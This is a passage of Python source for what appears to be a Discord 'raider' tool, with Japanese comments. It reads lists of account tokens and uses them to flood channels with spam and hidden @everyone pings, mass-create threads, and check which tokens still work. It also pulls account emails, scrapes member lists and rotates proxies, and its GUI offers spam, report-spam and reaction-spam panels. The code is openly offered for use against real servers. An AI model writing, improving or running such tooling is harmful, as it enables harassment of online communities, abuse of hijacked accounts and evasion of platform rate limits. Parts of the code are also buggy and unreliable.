                        randoms = randomname(7)
                        payload = {"content": f"{messages} {randoms} " +"||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||@everyone"}
                        headers = {"authorization": l.rstrip("\n")}
                        res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                        time.sleep(0.7)
                    except Exception as e:
                        print("Error: "+ e)         
    if modes == "5":
        house_id = input("1=Bravery 2=Brilliance 3=Balance 4=なし\nHouse Id >> ")
        with open(token_file + '.txt') as f:
            lines = f.readlines()
            while True:
                for l in lines:
                    try:
                        if house_id == "4":
                            headers = {"authorization": l.rstrip("\n")}
                            res = requests.delete(f"https://discord.com/api/v9/hypesquad/online", headers=headers)
                            if res.status_code == 204:
                                print(f"{Fore.GREEN} 成功{Fore.RESET}")
                            else: 
                                print(f"{Fore.RED} 失敗{Fore.RESET}")
                            time.sleep(1)
                            menu()
                        payload = {"house_id": house_id}
                        headers = {"authorization": l.rstrip("\n")}
                        res = requests.post(f"https://discord.com/api/v9/hypesquad/online", headers=headers, json=payload)
                        if res.status_code == 204:
                            print(f"{Fore.GREEN} 成功{Fore.RESET}")
                        else: 
                            print(f"{Fore.RED} 失敗{Fore.RESET}")
                        time.sleep(1)
                        menu()
                    except Exception as e:
                        print("Error: "+ e)        
    if modes == "6":
        forummode = input(f"[1]{Fore.GREEN}Threads Channel{Fore.RESET}\n[2]{Fore.RED}Message Threads{Fore.RESET}\nMode >> ")
        if forummode == "1":
            guild_id = input("Server Id >> ")
            forum_id = input("Forum Id >> ")
            forum_name = input("Forum name >> ")
            forum_message = input("Forum message >> ")
            with open(token_file + '.txt') as f:
                lines = f.readlines()
                while True:
                    for l in lines:
                        try:
                            randoms = randomname(7)
                            payload = {"name": f"{forum_name} " +randoms, "message": {"content": f"{forum_message}"}}
                            headers = {"authorization": l.rstrip("\n")}
                            res = requests.post(f"https://discord.com/api/v9/channels/{forum_id}/threads?use_nested_fields=true", headers=headers, json=payload)
                            print(l.rstrip("\n"))
                            print(res.text)
                        except Exception as e:
                            print("Error: "+ e) 
        if forummode == "2":
            channel_id = input("Channel Id >> ")
            message_all = int(input("Message All する=1 しない=0 >> "))
            if message_all == 0:
                message_id = input("Message Id >> ")
                forum_name = input("Forum name >> ")
                forum_message = input("Forum message >> ")
                with open(token_file + '.txt') as f:
                    lines = f.readlines()
                    while True:
                        for l in lines:
                            try:
                                randoms = randomname(7)
                                payload = {"name": f"{forum_name} " +randoms, "message": {"content": f"{forum_message}"}}
                                headers = {"authorization": l.rstrip("\n")}
                                res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/threads", headers=headers, json=payload)
                                print(l.rstrip("\n"))
                                print(res.text)
                            except Exception as e:
                                print("Error: "+ e) 
            if message_all == 1:
                token = input("Token >> ")
                forum_name = input("Forum name >> ")
                forum_message = input("Forum message >> ")
                mslist = get_messages(token,int(channel_id))
                tokens = token
                with open(token_file + '.txt') as f:
                    lines = f.readlines()
                    while True:
                        for l in lines:
                            try:
                                randoms = randomname(7)
                                message_id = random.choice(mslist)
                                payload = {"name": f"{forum_name} " +randoms, "message": {"content": f"{forum_message}"}}
                                headers = {"authorization": l.rstrip("\n")}
                                res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/threads", headers=headers, json=payload)
                                print(l.rstrip("\n"))
                                print(res.text)
                            except Exception as e:
                                print("Error: "+ e)                         
    if modes == "9":
        guild_id = input("Server Id >> ")
        nickname = input("Nickname >> ")
        with open(token_file + '.txt') as f:
            lines = f.readlines()
            while True:
                for l in lines:
                    try:
                        token=l.rstrip("\n")
                        payload = {"nick": nickname}
                        headers = {"authorization": token}
                        res = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=headers, json=payload)
                        #print(l.rstrip("\n"))
                        #print(res.text)
                        if res.status_code == 200:
                            print(f"{Fore.GREEN} Success Change {Fore.RESET}{token}")
                        elif res.status_code == 200:
                            print(f"{Fore.YELLOW} Rate Limited {Fore.CYAN}| {Fore.RESET}{token}")    
                        time.sleep(1)
                        menu()
                    except Exception as e:
                        print("Error: "+ e)   
    if modes == "13":
        check_type = input(f"[1]{Fore.GREEN}Slow Checker{Fore.RESET}\n[2]{Fore.GREEN}Fast Checker{Fore.RESET}\nMode >> ")                    
        if check_type == "1":
            print("Checker遅すぎワロタ")
            with open(token_file + '.txt') as f:
                for line in f:
                    token=line.strip("\n")
                    headers = {"authorization": token}
                    res = requests.get(f"https://discord.com/api/v9/users/@me", headers=headers)
                    if res.status_code == 200:                   
                        print(f"{Fore.GREEN}  Valid {Fore.CYAN}| {Fore.RESET}{token}")
                    elif res.status_code == 429:
                        print(f"{Fore.YELLOW}  Rate Limited {Fore.YELLOW}[{Fore.RESET}429{Fore.YELLOW}] {Fore.CYAN}| {Fore.RESET}{token}")
                    else:
                        print(f"{Fore.RED}  Invalid {Fore.CYAN}| {Fore.RESET}{token}")        
        if check_type == "2":
                lock = threading.Lock()
                def success(text): lock.acquire(); print(f"[{Fore.GREEN}>{Fore.RESET}] {Fore.GREEN}Valid {Fore.RESET}{text}{Fore.RESET}"); lock.release()
                def invalid(text): lock.acquire(); print(f"[{Fore.RED}>{Fore.RESET}] {Fore.RED}Invalid {Fore.RED} {text}{Fore.RESET}"); lock.release()

                with open(token_file + '.txt') as f: tokens = f.read().splitlines()
                headers = {"authorization": tokens}
                def check_token(token:str):
                    headers = {"authorization": token}
                    response = requests.get('https://discord.com/api/v9/users/@me/library', headers=headers,timeout=5)
                    if response.status_code == 200: success(f"| {token}")
                    else: tokens.remove(token); invalid(f"| {token}")
                def check_tokens():
                    threads=[]
                    for token in tokens:
                        try:threads.append(threading.Thread(target=check_token, args=(token,)))
                        except Exception as e: pass
                    for thread in threads: thread.start()
                    for thread in threads: thread.join()

                check_tokens()
                print(f'\n\n[\x1b[95m>\x1b[95m\x1B[37m] 全てのトークンをチェックしました')
                print(f'[\x1b[95m>\x1b[95m\x1B[37m] skidだから本当は生きてるトークンがあるかもしれない？')
                time.sleep(1)
                input('[\x1b[95m>\x1b[95m\x1B[37m] エンターを押して退出 ')
                                 
    if modes == "14":
        token_status = input(f"[1]{Fore.GREEN}Status Changer{Fore.RESET}\n[2]{Fore.GREEN}Activity Status Changer{Fore.RESET}\nMode >> ")
        if token_status == "1":
            status = input("候補 online,idle,dnd \nStatus >> ")
            with open(token_file + '.txt') as f:
                lines = f.readlines()
                for l in lines:    
                    tokens = l.rstrip("\n")
                    ws = websocket.WebSocket()
                    ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                    ws.send(json.dumps({
                        "op":2,
                            "d": {
                                "token": tokens,
                                "properties": {
                                    "$os": "Discord Android",
                                    "$browser": "Discord Android",
                                    "$device": "Discord Android",
                                },
                                "presence": {
                                    "game": {},
                                    "status": status,
                                    "since": 0,
                                    "activities": [],
                                    "afk": False,
                                },
                            },
                            "s": None,
                            "t": None,
                    }
                    )
                        )
                if status == "online":
                    (f"\n[\033[32m+\033[0m] Change Online | {tokens}")
                if status == "idle":
                    print(f"\n[\033[32m+\033[0m] Change Idle | {tokens}")
                if status == "dnd":
                    print(f"\n[\033[32m+\033[0m] Change Dnd | {tokens}")
                time.sleep(2)
                menu()
        if token_status == "2":
            game = input("Game Name >> ")
            details = input("一行下の文 >> ")
            state = input("二行下の文 >> ") 
            with open(token_file + '.txt') as f:
                lines = f.readlines()
                for l in lines:    
                    tokens = l.rstrip("\n")
                    ws = websocket.WebSocket()
                    ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                    ws.send(json.dumps({
                        "op":2,
                            "d": {
                                "token": tokens,
                                "properties": {
                                    "$os": "Discord Android",
                                    "$browser": "Discord Android",
                                    "$device": "Discord Android",
                                },
                                "presence": {
                                    "game": {                #初期設定
                                        "name": game,        #Ghost Raider
                                        "type": 0,           
                                        "details": details,  #Edited Version
                                        "state": state       #By cocoapc911
                                    },
                                    "status": "online",
                                    "since": 0,
                                    "activities": [],
                                    "afk": False,
                                },
                            },
                            "s": None,
                            "t": None,
                    }
                    )
                        )
                    print(f"\n[\033[32m+\033[0m] Activity Status Change | {tokens}")
                    time.sleep(2)
                    menu()
    if modes == "15":  
        checkmodes = input(f"[1]{Fore.GREEN}One{Fore.RESET}\n[2]{Fore.GREEN}All{Fore.RESET}\nCheck Mode >> ")
        if checkmodes == "1":
            os.system("cls")
            tokens = input(f"Token >> ")
            for i in tokens:
                token = i.rstrip()
                Info(token)
                menu()
        if checkmodes == "2":            
            with open(token_file + '.txt') as f:
                lines = f.readlines()
                for l in lines:  
                    token=l.rstrip("\n")
                    headers = {"authorization": token}
                    r = requests.get(f"https://discord.com/api/v9/users/@me", headers=headers)
                    userName = r.json()['username'] + '#' + r.json()['discriminator']
                    email = r.json()['email']
                    print(f'''-------------
[{Fore.LIGHTMAGENTA_EX}Token{Fore.RESET}]           {token}
[{Fore.LIGHTMAGENTA_EX}Username{Fore.RESET}]        {userName}
[{Fore.LIGHTMAGENTA_EX}Email{Fore.RESET}]           {email}
-------------''')
                    time.sleep(0.04545)      
    if modes == "99":
        print(COLOR.LIGHTBLUE_EX+"""
      01: RPC            02: Coming Soon    03: Coming Soon    04: Update Patch   05: About"""+Fore.RED+"""          
      06: Sushi          07: GHOST RAIDER !!GUI!!
        """+Color.RESET)
        modulemodes = input(f"Mode >> ")
        if modulemodes == "1":
            rpcmode = input(f"""{Fore.GREEN}
[1]ED Raider   [3]Coming Soon
[2]Coming Soon [4]Minecraft Mod                            
{Fore.RESET}Mode >> """)
            if rpcmode == "1":
                client_id = "1087494433236332544"
                rpc_obj = data.rpc.DiscordIpcClient.for_platform(client_id)  
                spinner = Halo(text='RPCを起動中... ', spinner='dots')
                spinner.start()
                time.sleep(2)
                spinner.text = "RPCを起動しました。"    
                spinner.succeed()
                time.sleep(2)  
                start_time = mktime(time.localtime()) 
                while True:
                    activity = {
                            "state": "dev version :)",  
                            "details": "New Discord Raid Tools.",
                            "timestamps": {
                                "start": start_time
                            },
                                "assets" : {
                                "large_image" : "20230213_183725_0000", # さっきコピーしたものを貼り付け
                                "large_text" : "ED Raider" # 画像にカーソルをあわせると表示されるテキスト
                                       }
                        }
                    rpc_obj.set_activity(activity)
                    menu()
                    time.sleep(900) # アクティビティを送信しすぎるとアクセスが拒否されるため     
            if rpcmode == "2":
                print("Coming Soon")                  
            if rpcmode == "4":
                rpcmodmode = input(f"""{Fore.GREEN}
[1]Impact   
[2]Coming Soon      
{Fore.RESET}Mode >> """)
                if rpcmodmode == "1":
                    client_id = "1087667715793244160"
                    rpc_obj = data.rpc.DiscordIpcClient.for_platform(client_id)  
                    spinner = Halo(text='RPCを起動中... ', spinner='dots')
                    spinner.start()
                    time.sleep(2)
                    spinner.text = "RPCを起動しました。"    
                    spinner.succeed()
                    time.sleep(2)  
                    start_time = mktime(time.localtime()) 
                    while True:
                        activity = {
                                "state": "Multiplayer",  
                                "details": "In Game",
                                "timestamps": {
                                    "start": start_time
                                },
                                    "assets" : {
                                    "large_image" : "24485394", # さっきコピーしたものを貼り付け
                                    "large_text" : "ED Raider" # 画像にカーソルをあわせると表示されるテキスト
                                           }
                            }
                        rpc_obj.set_activity(activity)
                        menu()
                        time.sleep(900) # アクティビティを送信しすぎるとアクセスが拒否されるため                        
        if modulemodes == "2":
            print("Coming Soon")
        if modulemodes == "3":
            print("Coming Soon")
        if modulemodes == "4":
            #print("Patch Notes")
            print("[>] UPDATED Patch Notes:\n\n[#] Color Change\n[#] Add Module\n[#] Add Sushi Raider Skid\n")
            time.sleep(2)
            input(f"エンターを押して戻る")
            menu()
        if modulemodes == "5":
            #Spinner()
            print(Color.BLUE+"\nED   Raider\n\nバグやほしい機能があったら教えてね\nDiscord: ☆にゃにゃっこ☆#5964\nGithub: https://github.com/HACKShinn1204/Ghost-Raider\nSkidしてごめん\nMino = ED\n\n"+Color.RESET)
            time.sleep(2)
            input(f"エンターを押して戻る")
            menu()
        if modulemodes == "6":
            print("Sushi Radier\nComing Soon")
            time.sleep(2)
            def proxy():
                with open("proxy.txt" , encoding="utf-8") as f:
                   return random.choice(f.readlines()).split("\n")[0]
            def sushimenu():
                clear_screen()
                print(Color.BLUE+"""
ー－－－－－－－－－－－－－－－－－－－－－－－－－－
|    .d8888. db    db .d8888. db   db d888888b        |
|    88'  YP 88    88 88'  YP 88   88   `88'          |
|    `8bo.   88    88 `8bo.   88ooo88    88           |
|      `Y8b. 88    88   `Y8b. 88~~~88    88           |
|    db   8D 88b  d88 db   8D 88   88   .88.          |
|    `8888Y' ~Y8888P' `8888Y' YP   YP Y888888P        |
|                                                     |
|    d8888b.  .d8b.  d888888b d8888b. d88888b d8888b. |
|    88  `8D d8' `8b   `88'   88  `8D 88'     88  `8D |
|    88oobY' 88ooo88    88    88   88 88ooooo 88oobY' |
|    88`8b   88~~~88    88    88   88 88~~~~~ 88`8b   |
|    88 `88. 88   88   .88.   88  .8D 88.     88 `88. |
|    88   YD YP   YP Y888888P Y8888D' Y88888P 88   YD |
ー－－－－－－－－－－－－－－－－－－－－－－－－－－
                """+Color.RESET)
                print(COLOR.LIGHTGREEN_EX+"""
ー－－－－－－－－－－－－－－－－－－－－

1: Spammer  3: Checker  5: ProxyChecker
2: Joiner   4: AllMemberGet       6: Back GR

ー－－－－－－－－－－－－－－－－－－－－
                """+Color.RESET)
                sushi_mode = input(COLOR.LIGHTMAGENTA_EX+"\nInput_Mode >> ")    
                if sushi_mode == "1":
                    channel_id = input("Channel_id >> ")
                    useproxy = input("Do you use Proxy? y/n >> ")
                    if useproxy == "y":
                        ffs = open('message.txt',"r",encoding="utf-8_sig")
                        messages = ffs.read()
                        def spamproxy():
                            global proxy
                            with ThreadPoolExecutor(max_workers=4) as executor:
                                with open(token_file + '.txt') as f:
                                    lines = f.readlines()
                                    while True:
                                        for l in lines:
                                            try:
                                                randomed = randomname(10)
                                                payload = {"content": f"{messages}\n"+randoms}
                                                headers = {"authorization": l.rstrip("\n")}
                                                res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload, proxies=proxy)
                                                print("Send: "+randoms)
                                            except Exception as e:
                                                print("Error: "+ e)          
                        while True:
                            time.sleep(0.4)
                            threading.Thread(target=spamproxy).start() 
                    if useproxy == "n":
                        ffs = open('message.txt',"r",encoding="utf-8_sig")
                        messages = ffs.read()
                        def spamnoproxy():
                            with ThreadPoolExecutor(max_workers=4) as executor:
                                with open(token_file + '.txt') as f:
                                    lines = f.readlines()
                                    while True:
                                        for l in lines:
                                            try:
                                                randomed = randomname(10)
                                                payload = {"content": f"{messages}\n"+randoms}
                                                headers = {"authorization": l.rstrip("\n")}
                                                res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                                print("Send: "+randoms)
                                            except Exception as e:
                                                print("Error: "+ e)          
                        while True:
                            time.sleep(0.4)
                            threading.Thread(target=spamnoproxy).start()                             
                if sushi_mode == "2":
                    print("Coming")
                if sushi_mode == "3":
                    print("Coming")
                if sushi_mode == "4":
                    tokens = input("Token >> ")
                    guild_id = input("Server Id >> ")
                    channel_id = input("Channel Id >> ")
                    save_file_name = input("Save File Name (.txtは消す)>> ")
                    bot = discum.Client(token=tokens, log=False)
                    def close_after_fetching(resp, guild_id):
                        if bot.gateway.finishedMemberFetching(guild_id):
                            bot.gateway.removeCommand({
                                'function': close_after_fetching,
                                'params': {
                                    'guild_id': guild_id
                                }
                            })
                            bot.gateway.close()

                    def get_members(guild_id, channel_id):
                        bot.gateway.fetchMembers(
                            guild_id, channel_id, keep="all",
                            wait=1)  #get all user attributes, wait 1 second between requests
                        bot.gateway.command({
                            'function': close_after_fetching,
                            'params': {
                                'guild_id': guild_id
                            }
                        })
                        bot.gateway.run()
                        bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                        return bot.gateway.session.guild(guild_id).members
                    members = get_members(guild_id, channel_id)
                    memberslist = []
                    for memberID in members:
                        print(f"メンバーを取得しました。{memberID}")
                        with open(save_file_name+".txt", 'w') as f:
                            f.write(f"{memberslist}\n")
                            f.close()
                        memberslist.append(memberID)
                    time.sleep(2)
                    sushimenu()    
                if sushi_mode == "5":
                    import requests
                    import concurrent.futures

                    def check_proxy(proxy):
                        proxy = proxy.strip()
                        try:
                            for protocol in ['http', 'https', 'socks4', 'socks5']:
                                proxy_dict = {protocol: f"{protocol}://{proxy}"}
                                response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=5)
                                if response.status_code == 200:
                                    with open('working_proxies.txt', 'a') as f:
                                        f.write(f"{protocol}://{proxy}\n")
                                        print(f"{protocol}://{proxy} is working")
                        except:
                            print(f"{proxy} is not working")

                    def check_proxies(file_path, num_threads=10):
                        with open(file_path+".txt", "r") as f:
                            proxies = f.readlines()

                        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
                            executor.map(check_proxy, proxies)

                    file_path = input("Proxy File >> ")
                    num_threads = int(input("Threads Count >> "))
                    check_proxies(file_path, num_threads)         
                if sushi_mode == "6":
                    menu()    
                else:
                    print("引数が不正または終了した操作です。")
                    time.sleep(1)
                    sushimenu() 
            sushimenu()      
        if modulemodes == "7":  
            print("open the gui")  
            import tkinter as tk
            import tkinter.messagebox as tmsg
            import tkinter.ttk as ttk
            root = tk.Tk()
            root.title(u"Ghost Raider")
            root.geometry("1300x765")
            root.iconbitmap(default="ghost.ico")
            root.configure(bg='grey13')
            # 上の部分
            uenolabel = tk.Label(background='#545454')
            uenolabel.place(x=0, y=0, height=95, width=1300)
            canvas = tk.Canvas(root,width = 1060, height = 90, bg = "white")
            canvas.place(x=240, y=0)
            rectangle = canvas.create_rectangle(0, -1, 1062, 91, outline = "gray", width = 1, fill = "#545454")
            nmlabel0 = tk.Label(background='#2C2C2C')
            nmlabel0.place(x=10, y=8, width=230, height=80)
            nmlabel1 = tk.Label(text='Ghost Raider', foreground='white', background='#2C2C2C', font=("Supernova",20,"bold"))
            nmlabel1.place(x=25, y=10)
            nmlabel2 = tk.Label(text='V2', foreground='white', background='#2C2C2C', font=("Supernova",20,"bold"))
            nmlabel2.place(x=95, y=50)
            cdlabel0 = tk.Label(background='#2C2C2C')
            cdlabel0.place(x=250, y=8, height=80, width=1055)
            cdlabel1 = tk.Label(text='Created By cocoapc911', foreground='white', background='#2C2C2C', font=("Supernova",15,"bold"))
            cdlabel1.place(x=270, y=20)
            cdlabel2 = tk.Label(text='Discord: ここあ#0001', foreground='white', background='#2C2C2C', font=("Supernova",15,"bold"))
            cdlabel2.place(x=280, y=45)
            cdlabel3 = tk.Label(text='discord.gg/6rmzcytnkM', foreground='white', background='#2C2C2C', font=("Supernova",15,"bold"))
            cdlabel3.place(x=560, y=30)
            # defまとめ
            # module frame
            def spammer():
                global spamchannelid_text
                global spamserverid_text
                global repchannelid_text
                global reachannelid_text
                global reamessageid_text
                global emojiname_text
                global rpychannelid_text
                global rpyserverid_text
                global rpymessageid_text
                global alc
                global blc
                global clc
                global dlc
                global mentioncount
                global token_text    
                frame = tk.Frame(root, width=1165, height=540)
                frame.place(x=135, y=95)
                frame.configure(bg="grey13")  #grey13 ##fff
                spamserverid_text = tk.StringVar() 
                spamchannelid_text = tk.StringVar() 
                reachannelid_text = tk.StringVar()
                reamessageid_text = tk.StringVar()
                repchannelid_text = tk.StringVar()
                repmessageid_text = tk.StringVar()
                emojiname_text = tk.StringVar()
                rpychannelid_text = tk.StringVar()
                rpyserverid_text = tk.StringVar()
                rpymessageid_text = tk.StringVar()
                alc = tk.BooleanVar()
                alc.set(False) #allch
                blc = tk.BooleanVar()
                blc.set(False) #allmt
                clc = tk.BooleanVar()
                clc.set(False)
                dlc = tk.BooleanVar()
                dlc.set(False)
                canvas = tk.Canvas(frame, bg="grey13", height=365, width=175)
                canvas.place(x=15, y=5)
                spamlabel = tk.Label(frame, text="Spammer",font=("Supernova",20,"bold"),foreground="#fff",bg="grey13")
                spamlabel.place(x=30, y=10)
                svidlabel = tk.Label(frame, text="Server ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                svidlabel.place(x=30, y=65)
                svidentry = tk.Entry(frame, width=25,textvariable=spamserverid_text)
                svidentry.place(x=30, y=90)
                chidlabel = tk.Label(frame, text="Channel ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                chidlabel.place(x=30, y=115)
                chidentry = tk.Entry(frame, width=25,textvariable=spamchannelid_text)
                chidentry.place(x=30, y=140)
                allch = tk.Checkbutton(frame, text="AllChannel",variable=alc,bg="#7c64e4",height=0, width=17)
                allch.place(x=30, y=170)
                allmt = tk.Checkbutton(frame, text="AllMention",variable=blc,bg="#7c64e4",height=0, width=17)
                allmt.place(x=30, y=205)
                ghmt = tk.Checkbutton(frame, text="GhostMention",variable=clc,bg="#7c64e4",height=0, width=17)
                ghmt.place(x=30, y=240)
                stsmbt = tk.Button(frame, text="Start Spam",foreground='black', background='#88CEEB', command=spammer_start)
                stsmbt.place(x=30,y=280,width=150,height=40)
                wismbt = tk.Button(frame, text="Stop Spam",foreground='black', background='#88CEEB', command=stop_spam)
                wismbt.place(x=30,y=330,width=150,height=40)      
                # Report
                canvas = tk.Canvas(frame, bg="grey13", height=200, width=200)
                canvas.place(x=200, y=5)
                repspamlabel = tk.Label(frame, text="Report Spam",font=("Supernova",20,"bold"),foreground="#fff",bg="grey13")
                repspamlabel.place(x=215, y=10)
                repchidlabel = tk.Label(frame, text="Channel ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                repchidlabel.place(x=225, y=65)
                repchidentry = tk.Entry(frame, width=25,textvariable=repchannelid_text)
                repchidentry.place(x=225, y=90)
                repmsidlabel = tk.Label(frame, text="Message ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                repmsidlabel.place(x=225, y=115)
                repmsidentry = tk.Entry(frame, width=25,textvariable=repmessageid_text)
                repmsidentry.place(x=225, y=140)
                stsmbt = tk.Button(frame, text="Start Spam",foreground='black', background='#88CEEB', command=repspam_start)
                stsmbt.place(x=225,y=170,width=155,height=35)
                # Reaction
                canvas = tk.Canvas(frame, bg="grey13", height=230, width=200)
                canvas.place(x=200, y=215)
                reaspamlabel = tk.Label(frame, text="Reaction Spam",font=("Supernova",17,"bold"),foreground="#fff",bg="grey13")
                reaspamlabel.place(x=215, y=220)
                repchidlabel = tk.Label(frame, text="Channel ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                repchidlabel.place(x=225, y=250)                
                reachidentry = tk.Entry(frame, width=25,textvariable=reachannelid_text)
                reachidentry.place(x=225, y=275)
                repmsidlabel = tk.Label(frame, text="Message ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                repmsidlabel.place(x=225, y=300)                
                reamsidentry = tk.Entry(frame, width=25,textvariable=reamessageid_text)
                reamsidentry.place(x=225, y=325)
                alms = tk.Checkbutton(frame, text="All Message",variable=dlc,bg="#7c64e4",height=0, width=17)
                alms.place(x=225, y=355)                
                module = (
                ':grinning:',':smiley:',':smile:',':grin:',':laughing:',':face_holding_back_tears:',':sweat_smile:',':joy:',':rofl:',':smiling_face_with_tear:',':relaxed:',':blush:',':innocent:',':slight_smile:',':upside_down:',':wink:',':relieved:',':heart_eyes:',':smiling_face_with_3_hearts:',':kissing_heart:',':kissing:',':kissing_smiling_eyes:',':kissing_closed_eyes:',':yum:',':stuck_out_tongue:',':stuck_out_tongue_closed_eyes:',':stuck_out_tongue_winking_eye:',':zany_face:',':face_with_raised_eyebrow:',':face_with_monocle:',':nerd:',':sunglasses:',':disguised_face:',':star_struck:',':partying_face:',':smirk:',':unamused:',':disappointed:',':pensive:',':worried:',':confused:',':slight_frown:',':frowning2:',':persevere:',':confounded:',':tired_face:',':weary:',':pleading_face:',':cry:',':sob:',':triumph:',':angry:',':rage:',':face_with_symbols_over_mouth:',':exploding_head:',':flushed:',':hot_face:',':cold_face:',':face_in_clouds:',':scream:',':fearful:',':cold_sweat:',':disappointed_relieved:',':sweat:',':hugging:',':face_with_peeking_eye:',':thinking:',':face_with_open_eyes_and_hand_over_mouth:',':saluting_face:',':shushing_face:',':melting_face:',':lying_face:',':no_mouth:',':dotted_line_face:',':neutral_face:',':face_with_diagonal_mouth:',':expressionless:',':grimacing:',':rolling_eyes:',':hushed:',':frowning:',':anguished:',':open_mouth:',':astonished:',':yawning_face:',':sleeping:',':drooling_face:',':sleepy:',':face_exhaling:',':dizzy_face:',':face_with_spiral_eyes:',':zipper_mouth:',':woozy_face:',':nauseated_face:',':face_vomiting:',':sneezing_face:',':mask:',':thermometer_face:',':head_bandage:',':money_mouth:',':cowboy:',':smiling_imp:',':imp:',':japanese_ogre:',':japanese_goblin:',':clown:',':poop:',':ghost:',':skull:',':skull_crossbones:',':alien:',':space_invader:',':robot:',':jack_o_lantern:',':smiley_cat:',':smile_cat:',':joy_cat:',':heart_eyes_cat:',':smirk_cat:',':kissing_cat:',':scream_cat:',':crying_cat_face:',':pouting_cat:',':joy_cat:',
                ':dog:',':cat:',':mouse:',':hamster:',':rabbit:',':fox:',':bear:',':panda_face:',':polar_bear:',':koala:',':tiger:',':lion_face:',':cow:',':pig:',':pig_nose:',':frog:',':monkey_face:',':see_no_evil:',':hear_no_evil:',':speak_no_evil:',':monkey:',':chicken:',':penguin:',':bird:',':baby_chick:',':hatching_chick:',':hatched_chick:',':duck:',':eagle:',':owl:',':bat:',':wolf:',':boar:',':horse:',':unicorn:',':bee:',':bug:',':butterfly:',':snail:',':worm:',':lady_beetle:',':ant:',':fly:',':mosquito:',':cockroach:',':beetle:',':cricket:',':spider:',':spider_web:',':scorpion:',':turtle:',':snake:',':lizard:',':t_rex:',':sauropod:',':octopus:',':squid:',':shrimp:',':lobster:',':crab:',':blowfish:',':tropical_fish:',':fish:',':seal:',':dolphin:',':whale:',':whale2:',':shark:',':crocodile:',':tiger2:',':leopard:',':zebra:',':gorilla:',':orangutan:',':elephant:',':mammoth:',':bison:',':hippopotamus:',':rhino:',':dromedary_camel:',':camel:',':giraffe:',':kangaroo:',':water_buffalo:',':ox:',':cow2:',':racehorse:',':pig2:',':ram:',':sheep:',':llama:',':goat:',':deer:',':dog2:',':poodle:',':guide_dog:',':service_dog:',':cat2:',':black_cat:',':feather:',':rooster:',':turkey:',':peacock:',':swan:',':parrot:',':flamingo:',':dove:',':rabbit2:',':raccoon:',':skunk:',':badger:',':beaver:',':otter:',':sloth:',':mouse2:',':rat:',':chipmunk:',':hedgehog:',':feet:',':dragon:',':dragon_face:',':cactus:',':christmas_tree:',':evergreen_tree:',':deciduous_tree:',':palm_tree:',':seedling:',':herb:',':shamrock:',':four_leaf_clover:',':bamboo:',':tanabata_tree:',':leaves:',':fallen_leaf:',':maple_leaf:',':empty_nest:',':nest_with_eggs:',':mushroom:',':shell:',':coral:',':rock:',':wood:',':ear_of_rice:',':potted_plant:',':bouquet:',':tulip:',':rose:',':wilted_rose:',':lotus:',':hibiscus:',':cherry_blossom:',':blossom:',':sunflower:',':sun_with_face:',':full_moon_with_face:',':first_quarter_moon_with_face:',':last_quarter_moon_with_face:',':new_moon_with_face:',':full_moon:',':waning_gibbous_moon:',':last_quarter_moon:',':waning_crescent_moon:',':new_moon:',':waxing_crescent_moon:',':first_quarter_moon:',':waxing_gibbous_moon:',':crescent_moon:',':earth_americas:',':earth_africa:',':earth_asia:',':ringed_planet:',':dizzy:',':star:',':star2:',':sparkles:',':zap:',':comet:',':boom:',':fire:',':cloud_tornado:',':rainbow:',':sunny:',':white_sun_small_cloud:',':partly_sunny:',':white_sun_cloud:',':cloud:',':white_sun_rain_cloud:',':cloud_rain:',':thunder_cloud_rain:',':cloud_lightning:',':cloud_snow:',':snowflake:',':snowman2:',':snowman:',':wind_blowing_face:',':dash:',':droplet:',':sweat_drops:',':bubbles:',':umbrella:',':umbrella2:',':ocean:',':fog:',
